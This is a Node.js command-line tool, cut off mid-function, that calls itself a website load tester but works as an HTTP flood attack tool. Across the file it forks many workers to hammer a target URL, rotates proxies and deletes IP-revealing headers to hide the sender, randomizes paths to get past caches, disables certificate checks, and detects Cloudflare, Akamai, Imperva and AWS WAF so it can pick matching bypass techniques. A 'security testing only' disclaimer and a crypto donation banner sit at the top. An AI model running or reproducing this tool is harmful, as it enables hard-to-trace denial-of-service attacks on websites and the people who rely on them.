#!/usr/bin/env node

/**
 * Advanced Website Load Testing Tool
 * For security testing and performance evaluation purposes only
 */

const cluster = require('cluster');
const os = require('os');
const https = require('https');
const http = require('http');
const http2 = require('http2');
const fs = require('fs');
const url = require('url');
const crypto = require('crypto');
const tunnel = require('tunnel');
const { program } = require('commander');
const userAgents = require('./user-agents.js');
const bypassTechniques = require('./bypass-techniques.js');
const wafBypassTechniques = require('./waf-bypass.js');
const networkDetector = require('./network-detector.js');
const { performance } = require('perf_hooks');

// Immediately check if this is a worker process and suppress output
if (cluster.isWorker) {
  // Completely silence worker processes
  console.log = () => {};
  console.error = () => {};
  console.warn = () => {};
  console.info = () => {};
  process.env.NODE_NO_WARNINGS = '1';
}

// Parse function for numeric parameters with fallback
const parseNum = (value, fallback) => {
  if (value === undefined || value === null) return fallback;
  const parsed = parseInt(value, 10);
  return isNaN(parsed) ? fallback : parsed;
};

// Parse function for boolean parameters
const parseBool = (value) => {
  if (typeof value === 'boolean') return value;
  if (value === undefined || value === null) return false;
  return value === 'true' || value === '1';
};

// Parse command line options
program
  .version('1.0.0')
  .description('Advanced Website Load Tester with security bypass features')
  .option('-t, --target <url>', 'Target URL')
  .option('-c, --connections <number>', 'Number of concurrent connections', parseNum, 10)
  .option('-d, --duration <seconds>', 'Test duration in seconds', parseNum, 30)
  .option('-m, --method <method>', 'HTTP method to use (GET, POST, etc.)', 'GET')
  .option('-p, --payload <file>', 'Payload file for POST/PUT requests')
  .option('-r, --rate <number>', 'Requests per second per worker', parseNum, 50)
  .option('-b, --bypass <techniques>', 'Comma-separated list of bypass techniques', 'all')
  .option('--headers <headers>', 'Custom headers in JSON format')
  .option('--verbose', 'Enable verbose output', parseBool, false)
  .option('--delay <ms>', 'Delay between requests in ms', parseNum, 0)
  .option('--proxy <proxy>', 'Use proxy (format: host:port)')
  .option('--proxy-file <file>', 'Load proxies from file (format: host:port per line)')
  .option('--log <file>', 'Log results to file')
  .option('--keep-alive', 'Use HTTP keep-alive', parseBool, false)
  .option('--randomize-path', 'Add random path segments to URL', parseBool, false)
  .option('--auto-detect', 'Auto-detect best bypass techniques for target', parseBool, false)
  .option('--timeout <ms>', 'Request timeout in milliseconds', parseNum, 10000)
  .option('--follow-redirects', 'Follow HTTP redirects', parseBool, false)
  .option('--max-redirects <number>', 'Maximum number of redirects to follow', parseNum, 5)
  .option('--no-warnings', 'Suppress TLS warnings', parseBool, false)
  .option('--protocol <protocol>', 'HTTP protocol to use (http1, http2)', 'http1')
  .option('--quiet', 'Suppress worker output and warnings', parseBool, false)
  .option('--no-banner', 'Do not display ASCII banner', parseBool, false)
  .option('--silent', 'Only show final results', parseBool, false)
  .parse(process.argv);

const options = program.opts();

// If master process and quiet/silent option, suppress output
if (cluster.isMaster && (options.quiet || options.silent)) {
  const originalConsoleLog = console.log;
  console.log = function() {
    // Convert arguments to string for checking
    const message = Array.from(arguments).join(' ');
    
    if (options.silent) {
      // In silent mode, only show test completion and results
      if (message.includes('Test completed') || 
          message.includes('Total requests:') || 
          message.includes('Successful requests:') ||
          message.includes('Failed requests:') ||
          message.includes('Requests/second:') ||
          message.includes('Bandwidth:') || 
          message.includes('Data transferred:') ||
          message.includes('Status codes:') ||
          message.includes('Total time:')) {
        originalConsoleLog.apply(console, arguments);
      }
    } else if (options.quiet) {
      // In quiet mode, show test statistics and some status messages
      if (message.includes('[*] Time:') || 
          message.includes('Test completed') || 
          message.includes('Total requests:') || 
          message.includes('Successful requests:') ||
          message.includes('Failed requests:') ||
          message.includes('Requests/second:') ||
          message.includes('Bandwidth:') || 
          message.includes('Data transferred:') ||
          message.includes('Status codes:') ||
          message.includes('Total time:') ||
          message.includes('[*] Target:') ||
          message.includes('[*] Method:') ||
          message.includes('[*] Connections:') ||
          message.includes('[*] Duration:') ||
          message.includes('[*] Request rate:')) {
        originalConsoleLog.apply(console, arguments);
      }
    } else {
      // Normal output mode
      originalConsoleLog.apply(console, arguments);
    }
  };
  
  // Also silence console.error in silent mode
  if (options.silent) {
    console.error = () => {};
  }
  
  process.env.NODE_NO_WARNINGS = '1';
}

// Validate and sanitize options
Object.keys(options).forEach(key => {
  if (typeof options[key] === 'string' && key !== 'target' && key !== 'method' && key !== 'bypass' && key !== 'protocol') {
    // Try to parse numeric strings
    if (/^\d+$/.test(options[key])) {
      options[key] = parseInt(options[key], 10);
    }
    // Try to parse boolean strings
    else if (options[key] === 'true' || options[key] === 'false') {
      options[key] = options[key] === 'true';
    }
  }
});

// Suppress TLS warnings if requested
if (options.noWarnings || options.quiet) {
  process.env.NODE_NO_WARNINGS = '1';
  
  // Suppress the NODE_TLS_REJECT_UNAUTHORIZED warning
  // This needs to be done before setting the environment variable
  const originalEmit = process.emit;
  process.emit = function(name, data, ...args) {
    if (
      name === 'warning' && 
      data && 
      data.message && 
      (data.message.includes('NODE_TLS_REJECT_UNAUTHORIZED') || 
       data.message.includes('TLS connections'))
    ) {
      return false;
    }
    return originalEmit.apply(process, [name, data, ...args]);
  };
}

// Disable certificate validation for testing purposes
process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0';

// Validate arguments
if (!options.target) {
  console.error('Error: Target URL is required');
  program.help();
  process.exit(1);
}

// Try to parse the URL to ensure it's valid
try {
  new URL(options.target);
} catch (e) {
  console.error('Error: Invalid target URL format');
  process.exit(1);
}

// Load proxies from file if specified
let proxyList = [];
if (options.proxyFile) {
  try {
    const proxyData = fs.readFileSync(options.proxyFile, 'utf8');
    proxyList = proxyData.split('\n')
      .map(line => line.trim())
      .filter(line => line && line.includes(':'));
    
    if (proxyList.length === 0) {
      console.error('Error: No valid proxies found in file');
      process.exit(1);
    }
    
    console.log(`[*] Loaded ${proxyList.length} proxies from ${options.proxyFile}`);
  } catch (e) {
    console.error(`Error reading proxy file: ${e.message}`);
    process.exit(1);
  }
}

console.log(`[*] Target: ${options.target}`);
console.log(`[*] Method: ${options.method}`);
console.log(`[*] Connections: ${options.connections}`);
console.log(`[*] Duration: ${options.duration} seconds`);
console.log(`[*] Request rate: ${options.rate} requests/second/worker`);

if (options.proxy) {
  console.log(`[*] Using proxy: ${options.proxy}`);
} else if (proxyList.length > 0) {
  console.log(`[*] Using ${proxyList.length} proxies in rotation`);
}

// Validate protocol - this validation is still needed
if (options.protocol !== 'http1' && options.protocol !== 'http2') {
  console.log(`Warning: Invalid protocol "${options.protocol}", using http1`);
  options.protocol = 'http1';
} else if (options.protocol === 'http2') {
  console.log(`[*] Using HTTP/2 protocol`);
}

// Initialize target details
const targetUrl = new url.URL(options.target);
const targetProtocol = targetUrl.protocol === 'https:' ? https : http;
const targetPort = targetUrl.port || (targetUrl.protocol === 'https:' ? 443 : 80);

// Parse custom headers
let customHeaders = {};
if (options.headers) {
  try {
    customHeaders = JSON.parse(options.headers);
  } catch (e) {
    console.error('Error parsing custom headers:', e.message);
    process.exit(1);
  }
}

// Parse payload data for POST/PUT requests
let payloadData = '';
if (options.payload && ['POST', 'PUT', 'PATCH'].includes(options.method.toUpperCase())) {
  try {
    payloadData = fs.readFileSync(options.payload, 'utf8');
  } catch (e) {
    console.error(`Error reading payload file: ${e.message}`);
    process.exit(1);
  }
}

// Parse bypass techniques
let bypassOptions = options.bypass === 'all' 
  ? [...Object.keys(bypassTechniques), ...Object.keys(wafBypassTechniques)]
  : options.bypass.split(',');

// Stats tracking
const stats = {
  requests: 0,
  successful: 0,
  failed: 0,
  statusCodes: {},
  startTime: null,
  endTime: null,
  workers: 0,
  bytesReceived: 0,
  bytesSent: 0
};

// For master process
if (cluster.isMaster) {
  // Check if we should display the banner
  const shouldShowBanner = !options.silent && options.noBanner !== false;
  
  if (shouldShowBanner) {
    console.log(`
 ▄▄▄▄▄▄▄▄▄▄▄  ▄         ▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄ 
▐░░░░░░░░░░░▌▐░▌       ▐░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌
▐░█▀▀▀▀▀▀▀▀▀ ▐░▌       ▐░▌▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀▀▀ ▐░█▀▀▀▀▀▀▀▀▀ 
▐░▌          ▐░▌       ▐░▌▐░▌       ▐░▌▐░▌          ▐░▌          
▐░█▄▄▄▄▄▄▄▄▄ ▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄▄▄ ▐░█▄▄▄▄▄▄▄▄▄ 
▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌
 ▀▀▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌ ▀▀▀▀▀▀▀▀▀█░▌ ▀▀▀▀▀▀▀▀▀█░▌
          ▐░▌▐░▌       ▐░▌▐░▌       ▐░▌          ▐░▌          ▐░▌
 ▄▄▄▄▄▄▄▄▄█░▌▐░▌       ▐░▌▐░▌       ▐░▌ ▄▄▄▄▄▄▄▄▄█░▌ ▄▄▄▄▄▄▄▄▄█░▌
▐░░░░░░░░░░░▌▐░▌       ▐░▌▐░▌       ▐░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌
 ▀▀▀▀▀▀▀▀▀▀▀  ▀         ▀  ▀         ▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀▀ 
                                                                   
Advanced Website Load Testing Tool
For security testing and performance evaluation purposes only
Developed By Triotion (https://t.me/Triotion)
---------------------------------------------------------------
If you find this tool valuable, consider donating to support ongoing development:

BTC: bc1qtkm7dzjp76gx8t9c02pshfd8rzarj6gj9yzglu
ETH: 0x88Aa0E09a5A62919321f38Fb4782A17f4dc91A9B
XMR: 0x6730c52B3369fD22E3ACc6090a3Ee7d5C617aBE0
---------------------------------------------------------------
`);
  }

  // Only print configuration in non-silent mode
  if (!options.silent) {
    console.log(`[*] Target: ${options.target}`);
    console.log(`[*] Method: ${options.method}`);
    console.log(`[*] Connections: ${options.connections}`);
    console.log(`[*] Duration: ${options.duration} seconds`);
    console.log(`[*] Request rate: ${options.rate} requests/second/worker`);
    
    if (options.proxy) {
      console.log(`[*] Using proxy: ${options.proxy}`);
    } else if (proxyList.length > 0) {
      console.log(`[*] Using ${proxyList.length} proxies in rotation`);
    }
    
    if (options.protocol === 'http2') {
      console.log(`[*] Using HTTP/2 protocol`);
    }
  }
  
  // Auto-detect protection systems if enabled
  if (options.autoDetect) {
    console.log(`[*] Auto-detecting protection systems...`);
    
    networkDetector.detectProtectionSystems(options.target)
      .then(result => {
        const detected = result.detected.join(', ') || 'None';
        console.log(`[*] Detected protection systems: ${detected}`);
        
        // Use recommended bypass techniques
        if (result.recommendedBypass.length > 0) {
          bypassOptions = result.recommendedBypass;
          console.log(`[*] Using recommended bypass techniques: ${bypassOptions.join(', ')}`);
        } else if (detected.includes('Cloudflare')) {
          // Cloudflare detected - prioritize Cloudflare-specific bypass techniques
          bypassOptions = [
            'cloudflareBypass',
            'cloudflareUAMBypass', 
            'cloudflareTurnstileBypass', 
            'cloudflareManagedChallengeBypass',
            'advancedCloudflareBypass',
            'browserCapabilities',
            'securityTokenEmulation',
            'randomizeHeaderOrder',
            'believableReferrer',
            'antiMeasurementEvasion'
          ];
          console.log(`[*] Cloudflare detected - using specialized bypass techniques: ${bypassOptions.join(', ')}`);
        } else if (detected.includes('Akamai')) {
          // Akamai detected
          bypassOptions = [
            'akamaiBotManagerBypass',
            'neuralNetworkWafBypass',
            'tlsFingerprintScrambling',
            'browserCapabilities',
            'navigationBehavior',
            'securityTokenEmulation'
          ];
          console.log(`[*] Akamai detected - using specialized bypass techniques: ${bypassOptions.join(', ')}`);
        } else if (detected.includes('Imperva') || detected.includes('Incapsula')) {
          // Imperva detected
          bypassOptions = [
            'impervaAdvancedBypass',
            'neuralNetworkWafBypass',
            'browserCapabilities',
            'navigationBehavior',
            'securityTokenEmulation',
            'clientHints'
          ];
          console.log(`[*] Imperva detected - using specialized bypass techniques: ${bypassOptions.join(', ')}`);
        } else if (detected.includes('AWS') || detected.includes('Amazon')) {
          // AWS WAF detected
          bypassOptions = [
            'awsWafShieldBypass',
            'neuralNetworkWafBypass',
            'tlsFingerprintScrambling',
            'browserCapabilities',
            'securityTokenEmulation'
          ];
          console.log(`[*] AWS WAF detected - using specialized bypass techniques: ${bypassOptions.join(', ')}`);
        } else {
          // Generic WAF or unknown protection
          bypassOptions = [
            'neuralNetworkWafBypass',
            'tlsFingerprintScrambling',
            'randomizeHeaderOrder',
            'browserCapabilities',
            'securityTokenEmulation',
            'navigationBehavior',
            'clientHints'
          ];
          console.log(`[*] Using generic WAF bypass techniques: ${bypassOptions.join(', ')}`);
        }
        
        // Start test after detection
        startTest();
      })
      .catch(err => {
        console.error(`[!] Error during protection detection: ${err.message}`);
        console.log(`[*] Continuing with specified bypass techniques`);
        startTest();
      });
  } else {
    console.log(`[*] Bypass techniques: ${bypassOptions.join(', ')}`);
    startTest();
  }
  
  // Function to start the actual test
  function startTest() {
    // Start workers based on CPU cores (max of connections)
    const numCPUs = Math.min(os.cpus().length, options.connections);
    stats.workers = numCPUs;
    
    console.log(`[*] Starting ${numCPUs} worker processes...`);
    
    // Track completed workers
    let completedWorkers = 0;
    let activeWorkers = 0;
    
    // Fork workers
    for (let i = 0; i < numCPUs; i++) {
      // Pass silent flag to worker to prevent console output duplication
      const worker = cluster.fork({ WORKER_SILENT: '1' });
      activeWorkers++;
      
      // Send bypass options to worker
      worker.send({ 
        type: 'config', 
        bypassOptions, 
        proxyList, 
        settings: {
          connections: options.connections,
          rate: options.rate,
          duration: options.duration,
          timeout: options.timeout,
          delay: options.delay,
          quiet: true // Force worker to be quiet
        }
      });
      
      // Handle messages from workers
      worker.on('message', (msg) => {
        if (msg.type === 'stats') {
          stats.requests += msg.data.requests;
          stats.successful += msg.data.successful;
          stats.failed += msg.data.failed;
          stats.bytesReceived += msg.data.bytesReceived || 0;
          stats.bytesSent += msg.data.bytesSent || 0;
          
          // Merge status codes
          for (const code in msg.data.statusCodes) {
            stats.statusCodes[code] = (stats.statusCodes[code] || 0) + msg.data.statusCodes[code];
          }
        } else if (msg.type === 'completed') {
          completedWorkers++;
          activeWorkers--;
          
          // All workers completed, show final stats
          if (completedWorkers === numCPUs) {
            stats.endTime = Date.now();
            printFinalStats();
            
            // Log results if specified
            if (options.log) {
              const logData = {
                target: options.target,
                method: options.method,
                duration: options.duration,
                connections: options.connections,
                bypass: bypassOptions,
                stats
              };
              
              fs.writeFileSync(options.log, JSON.stringify(logData, null, 2));
              console.log(`[*] Results logged to ${options.log}`);
            }
            
            process.exit(0);
          }
        }
      });
      
      // Handle worker crashes
      worker.on('exit', (code, signal) => {
        activeWorkers--;
        if (signal) {
          // Worker was killed
          if (options.verbose && !options.quiet) {
            console.log(`[!] Worker was killed by signal: ${signal}`);
          }
        } else if (code !== 0) {
          // Worker crashed
          if (options.verbose && !options.quiet) {
            console.log(`[!] Worker exited with error code: ${code}`);
          }
          
          // Respawn worker if test is still running
          if (Date.now() - stats.startTime < options.duration * 1000) {
            spawnWorker();
          }
        }
      });
    }
    
    // Print stats periodically
    stats.startTime = Date.now();
    const statsInterval = setInterval(() => {
      printStats();
    }, 5000);
    
    // Set test duration
    setTimeout(() => {
      clearInterval(statsInterval);
      for (const id in cluster.workers) {
        cluster.workers[id].send({ type: 'stop' });
      }
    }, options.duration * 1000);
  }
  
  // Print final stats
  function printFinalStats() {
    const totalTime = (stats.endTime - stats.startTime) / 1000;
    const rps = Math.round(stats.requests / totalTime);
    
    console.log('\n---------------------------------------------------------------');
    console.log('Test completed');
    console.log('---------------------------------------------------------------');
    console.log(`Total requests: ${stats.requests}`);
    console.log(`Successful requests: ${stats.successful}`);
    console.log(`Failed requests: ${stats.failed}`);
    console.log(`Requests/second: ${rps}`);
    
    // Calculate bandwidth with proper byte count
    const totalMBReceived = Math.max(0, stats.bytesReceived) / (1024 * 1024);
    const totalMBSent = Math.max(0, stats.bytesSent) / (1024 * 1024);
    const mbpsReceived = (totalMBReceived * 8) / totalTime;
    const mbpsSent = (totalMBSent * 8) / totalTime;
    
    console.log(`Bandwidth: ${mbpsReceived.toFixed(2)} Mbps received, ${mbpsSent.toFixed(2)} Mbps sent`);
    console.log(`Data transferred: ${totalMBReceived.toFixed(2)} MB received, ${totalMBSent.toFixed(2)} MB sent`);
    
    console.log('Status codes:');
    
    for (const code in stats.statusCodes) {
      console.log(`  ${code}: ${stats.statusCodes[code]}`);
    }
    
    console.log(`Total time: ${totalTime.toFixed(2)} seconds`);
    console.log('---------------------------------------------------------------');
  }
  
  // Print current stats
  function printStats() {
    const currentTime = Date.now();
    const elapsedTime = (currentTime - stats.startTime) / 1000;
    const rps = Math.round(stats.requests / elapsedTime);
    
    console.log(`[*] Time: ${elapsedTime.toFixed(1)}s, Requests: ${stats.requests}, RPS: ${rps}, Success: ${stats.successful}, Failed: ${stats.failed}`);
  }
  
  // Handle termination
  process.on('SIGINT', () => {
    console.log('\n[!] Test interrupted');
    for (const id in cluster.workers) {
      cluster.workers[id].send({ type: 'stop' });
    }
    stats.endTime = Date.now();
    printFinalStats();
    process.exit(0);
  });
  
} else {
  // For worker process
  
  // Check if worker should be silent
  const silent = process.env.WORKER_SILENT === '1' || true;
  
  // Completely silence the worker process if needed
  if (silent) {
    // Override console methods to suppress output
    console.log = () => {};
    console.error = () => {};
    console.warn = () => {};
    console.info = () => {};
  }
  
  const workerStats = {
    requests: 0,
    successful: 0,
    failed: 0,
    statusCodes: {},
    bytesReceived: 0,
    bytesSent: 0
  };
  
  // Handle worker process errors
  process.on('uncaughtException', (err) => {
    // Only log errors in verbose mode and when not silent
    if (options.verbose && !silent) {
      console.error(`[!] Worker uncaught exception: ${err.message}`);
    }
    
    // Try to send stats before exiting
    try {
      process.send({ type: 'stats', data: workerStats });
    } catch (e) {
      // Ignore send errors
    }
    
    process.exit(1);
  });
  
  // Proxy rotation index
  let proxyIndex = 0;
  let proxyList = [];
  let bypassOptions = [];
  
  // Get bypass options from master
  process.on('message', (msg) => {
    if (msg.type === 'config') {
      bypassOptions = msg.bypassOptions;
      proxyList = msg.proxyList || [];
      
      // Apply any settings from master
      if (msg.settings) {
        Object.assign(options, msg.settings);
      }
    } else if (msg.type === 'stop') {
      clearInterval(reportInterval);
      clearInterval(requestInterval);
      process.send({ type: 'completed' });
    }
  });
  
  // Send stats to master periodically
  const reportInterval = setInterval(() => {
    process.send({ type: 'stats', data: workerStats });
  }, 1000);
  
  // Get next proxy from list with round-robin
  const getNextProxy = () => {
    if (proxyList.length === 0) return null;
    
    // Try up to 3 proxies in case some are invalid
    for (let i = 0; i < 3; i++) {
      const proxy = proxyList[proxyIndex];
      proxyIndex = (proxyIndex + 1) % proxyList.length;
      
      // Basic validation of proxy format
      if (proxy && proxy.includes(':')) {
        const [host, port] = proxy.split(':');
        if (host && port && !isNaN(parseInt(port, 10))) {
          return proxy;
        }
      }
    }
    
    // If we couldn't find a valid proxy after 3 tries, return null
    return null;
  };
  
  // Setup request interval
  let requestInterval;
  
  // Wait for initial config message before starting requests
  const startRequestInterval = () => {
    if (bypassOptions.length === 0) {
      setTimeout(startRequestInterval, 100);
      return;
    }
    
    // Ensure delay is a valid number
    const delay = options.delay && !isNaN(options.delay) ? options.delay : 10;
    
    // Perform requests at specified rate
    requestInterval = setInterval(() => {
      const requestsPerInterval = delay ? 
        1 : Math.max(1, Math.floor(options.rate / (1000 / 10)));
      
      for (let i = 0; i < requestsPerInterval; i++) {
        performRequest();
      }
    }, delay);
  };
  
  // Only display warnings in the master process
  if (!options.suppressWarnings) {
    startRequestInterval();
  } else {
    // For worker processes, start silently
    startRequestInterval();
  }
  
  // Create request options with bypass techniques
  function createRequestOptions(targetUrl) {
    const parsedUrl = new url.URL(targetUrl || options.target);
    let path = parsedUrl.pathname + parsedUrl.search;
    
    // Apply randomized path if enabled
    if (options.randomizePath) {
      const randomPath = crypto.randomBytes(8).toString('hex');
      path = path + (path.includes('?') ? '&' : '?') + randomPath + '=' + Date.now();
    }
    
    // Determine if we're using HTTP/1.1 or HTTP/2
    const isHttp2 = options.protocol === 'http2' && parsedUrl.protocol === 'https:';
    
    // Base request options with default headers
    const requestOptions = {
      hostname: parsedUrl.hostname,
      port: parsedUrl.port || (parsedUrl.protocol === 'https:' ? 443 : 80),
      path: path,
      method: options.method,
      headers: {
        'User-Agent': userAgents.getRandomUserAgent(),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': options.keepAlive ? 'keep-alive' : 'close',
        'Upgrade-Insecure-Requests': '1',
        'Cache-Control': 'no-cache',
        'Pragma': 'no-cache',
        ...customHeaders
      },
      timeout: options.timeout,
      // Add SSL/TLS options
      rejectUnauthorized: false
    };
    
    // Apply selected bypass techniques
    bypassOptions.forEach(technique => {
      if (bypassTechniques[technique]) {
        try {
          bypassTechniques[technique](requestOptions);
        } catch (error) {
          if (options.verbose) {
            console.error(`Error applying bypass technique ${technique}: ${error.message}`);
          }
        }
      } else if (wafBypassTechniques[technique]) {
        try {
          wafBypassTechniques[technique](requestOptions);
        } catch (error) {
          if (options.verbose) {
            console.error(`Error applying WAF bypass technique ${technique}: ${error.message}`);
          }
        }
      }
    });
    
    // Apply proxy if available
    const proxy = options.proxy || getNextProxy();
    
    if (proxy) {
      const [host, port] = proxy.split(':');
      
      // Add proxy auth if provided in the format user:pass@host:port
      let proxyAuth = null;
      let proxyHost = host;
      
      if (host.includes('@')) {
        const [auth, hostPart] = host.split('@');
        proxyAuth = auth;
        proxyHost = hostPart;
      }
      
      // For HTTP/1.1 requests through proxy
      if (parsedUrl.protocol === 'https:') {
        // For HTTPS, use tunnel agent
        const tunnel = require('tunnel');
        
        // Create tunnel agent
        requestOptions.agent = tunnel.httpsOverHttp({
          proxy: {
            host: proxyHost,
            port: parseInt(port, 10),
            proxyAuth: proxyAuth
          }
        });
        
        // Keep original hostname, port and path
        requestOptions.hostname = parsedUrl.hostname;
        requestOptions.port = parsedUrl.port || 443;
        requestOptions.path = requestOptions.path;
      } else {
        // For HTTP, use direct proxy
        requestOptions.hostname = proxyHost;
        requestOptions.port = parseInt(port, 10);
        requestOptions.path = parsedUrl.href; // Use full URL for proxy requests
        
        // Add proxy auth if present
        if (proxyAuth) {
          requestOptions.headers['Proxy-Authorization'] = 'Basic ' + Buffer.from(proxyAuth).toString('base64');
        }
      }
      
      // Ensure we're not leaking the original IP
      requestOptions.headers['Proxy-Connection'] = 'Keep-Alive';
      
      // Remove any headers that might reveal original IP
      delete requestOptions.headers['X-Forwarded-For'];
      delete requestOptions.headers['X-Real-IP'];
      delete requestOptions.headers['X-Client-IP'];
    }
    
    // Count request size (headers + URL)
    const headerSize = Buffer.from(JSON.stringify(requestOptions.headers)).length;
    const urlSize = Buffer.from(requestOptions.path).length;
    workerStats.bytesSent += headerSize + urlSize;
    
    return requestOptions;
  }
  
  // Perform HTTP request with bypass techniques
  function performRequest() {
    const requestStart = performance.now();
    const requestOptions = createRequestOptions();
    
    // Get the proxy to use for this request
    const proxyToUse = options.proxy || getNextProxy();
    
    try {
      // Parse the URL
      const parsedUrl = new URL(options.target);
      
      if (options.protocol === 'http2') {
        // HTTP/2 request implementation
        try {
          const h2Options = {
            rejectUnauthorized: false,
            settings: {
              enablePush: false,
              initialWindowSize: 1024 * 1024, // 1MB
              maxSessionMemory: 64 * 1024 * 1024 // 64MB
            }
          };
          
          // Parse the URL to get the correct authority
          const authority = `${parsedUrl.hostname}${parsedUrl.port ? `:${parsedUrl.port}` : ''}`;
          
          // Handle proxy for HTTP/2 if needed
          let client;
          if (proxyToUse) {
            // Extract proxy parts
            const [proxyHost, proxyPort] = proxyToUse.split(':');
            
            // Extract auth if provided
            let proxyAuthValue = null;
            let actualProxyHost = proxyHost;
            
            if (proxyHost.includes('@')) {
              const [auth, host] = proxyHost.split('@');
              proxyAuthValue = auth;
              actualProxyHost = host;
            }
            
            // Create a tunnel first for HTTP/2 over proxy
            const tunnelAgent = tunnel.httpsOverHttp({
              proxy: {
                host: actualProxyHost,
                port: parseInt(proxyPort, 10),
                proxyAuth: proxyAuthValue
              }
            });
            
            // Connect using the tunnel
            const socket = tunnelAgent.createConnection({
              host: parsedUrl.hostname,
              port: parsedUrl.port || 443,
              servername: parsedUrl.hostname
            });
            
            // Once the socket is ready, connect HTTP/2 over it
            socket.on('connect', () => {
              try {
                const clientOptions = {
                  ...h2Options,
                  socket: socket // Use the established tunnel
                };
                
                client = http2.connect(`https://${authority}`, clientOptions);
                
                // Continue with the HTTP/2 request over the tunnel
                sendHttp2Request(client, requestOptions, authority);
              } catch (e) {
                workerStats.failed++;
                workerStats.requests++;
                socket.destroy();
              }
            });
            
            socket.on('error', (err) => {
              workerStats.failed++;
              workerStats.requests++;
              if (options.verbose) {
                console.error(`Proxy tunnel error: ${err.message}`);
              }
            });
            
            // Return early since the request will be sent once the tunnel is established
            return;
          } else {
            // Direct HTTP/2 connection (no proxy)
            client = http2.connect(`https://${authority}`, h2Options);
            
            // Send the HTTP/2 request directly
            sendHttp2Request(client, requestOptions, authority);
          }
        } catch (error) {
          workerStats.failed++;
          workerStats.requests++;
          if (options.verbose) {
            console.error(`HTTP/2 error: ${error.message}`);
          }
        }
      } else {
        // HTTP/1.1 request
        try {
          const protocol = parsedUrl.protocol === 'https:' ? https : http;
          
          // Handle proxy for HTTP/1.1
          if (proxyToUse) {
            // Extract proxy parts
            const [proxyHost, proxyPort] = proxyToUse.split(':');
            
            // Extract auth if provided
            let proxyAuthValue = null;
            let actualProxyHost = proxyHost;
            
            if (proxyHost.includes('@')) {
              const [auth, host] = proxyHost.split('@');
              proxyAuthValue = auth;
              actualProxyHost = host;
            }
            
            // Create appropriate tunnel agent
            if (parsedUrl.protocol === 'https:') {
              // For HTTPS requests through HTTP proxy
              requestOptions.agent = tunnel.httpsOverHttp({
                proxy: {
                  host: actualProxyHost,
                  port: parseInt(proxyPort, 10),
                  proxyAuth: proxyAuthValue
                },
                rejectUnauthorized: false
              });
            } else {
              // For HTTP requests through HTTP proxy
              requestOptions.agent = tunnel.httpOverHttp({
                proxy: {
                  host: actualProxyHost,
                  port: parseInt(proxyPort, 10),
                  proxyAuth: proxyAuthValue
                }
              });
            }
            
            // Make sure we're using the target hostname, not the proxy's
            requestOptions.hostname = parsedUrl.hostname;
            requestOptions.port = parsedUrl.port || (parsedUrl.protocol === 'https:' ? 443 : 80);
            requestOptions.headers['Host'] = parsedUrl.hostname;
          }
          
          // Send HTTP/1.1 request
          const request = protocol.request(requestOptions, (response) => {
            // Handle redirects if enabled
            if (options.followRedirects && (response.statusCode === 301 || response.statusCode === 302 || response.statusCode === 307 || response.statusCode === 308)) {
              const location = response.headers.location;
              if (location) {
                // Create a new request to the redirect location
                try {
                  const redirectUrl = new URL(location, options.target);
                  performRequest(redirectUrl.href);
                } catch (e) {
                  // Failed to follow redirect
                  workerStats.failed++;
                }
                // Count the original request
                workerStats.requests++;
                return;
              }
            }
            
            let responseSize = 0;
            let responseBody = [];
            
            response.on('data', (chunk) => {
              responseSize += chunk.length;
              workerStats.bytesReceived += chunk.length;
              responseBody.push(chunk);
            });
            
            response.on('end', () => {
              const requestEnd = performance.now();
              
              if (response.statusCode >= 200 && response.statusCode < 400) {
                workerStats.successful++;
              } else {
                workerStats.failed++;
              }
              
              workerStats.requests++;
            });
          });
          
          request.on('error', (err) => {
            workerStats.failed++;
            workerStats.requests++;
            if (options.verbose) {
              console.error(`Error in HTTP/1.1 request: ${err.message}`);
            }
          });
          
          request.on('timeout', () => {
            request.destroy();
            workerStats.failed++;
            workerStats.requests++;
          });
          
          // Send payload if applicable
          if (['POST', 'PUT', 'PATCH'].includes(options.method)) {
            // Default to empty payload if none provided
            let payload = payloadData;
            if (!payload && options.method !== 'GET') {
              payload = `data=${Date.now()}`;
              
              // Add content-type header if not present
              if (!requestOptions.headers['Content-Type']) {
                requestOptions.headers['Content-Type'] = 'application/x-www-form-urlencoded';
              }
            }
            
            if (payload) {
              const buffer = Buffer.from(payload);
              // Count request headers + URL in sent bytes
              const headerStr = Object.entries(requestOptions.headers)
                .map(([key, value]) => `${key}: ${value}`)
                .join('\r\n');
              const requestLine = `${options.method} ${requestOptions.path} HTTP/1.1\r\n`;
              const headerSize = Buffer.from(headerStr + '\r\n\r\n').length;
              const requestLineSize = Buffer.from(requestLine).length;
              workerStats.bytesSent += headerSize + requestLineSize + buffer.length;
              request.write(buffer);
            }
          }
          
          request.end();
        } catch (error) {
          workerStats.failed++;
          workerStats.requests++;
          if (options.verbose) {
            console.error(`HTTP/1.1 error: ${error.message}`);
          }
        }
      }
    } catch (error) {
      workerStats.failed++;
      workerStats.requests++;
      if (options.verbose) {
        console.error(`Request error: ${error.message}`);
      }
    }
  }
  
  // Helper function for sending HTTP/2 requests
  function sendHttp2Request(client, requestOptions, authority) {
    client.on('error', (err) => {
      workerStats.failed++;
      workerStats.requests++;
      try {
        client.close();
      } catch (e) {
        // Ignore close errors
      }
    });
    
    const headers = {
      ':method': requestOptions.method,
      ':path': requestOptions.path,
      ':scheme': 'https',
      ':authority': authority
    };
    
    // Add all HTTP/2 compatible headers
    for (const [key, value] of Object.entries(requestOptions.headers)) {
      // Skip HTTP/1.x specific headers and HTTP/2 pseudo-headers
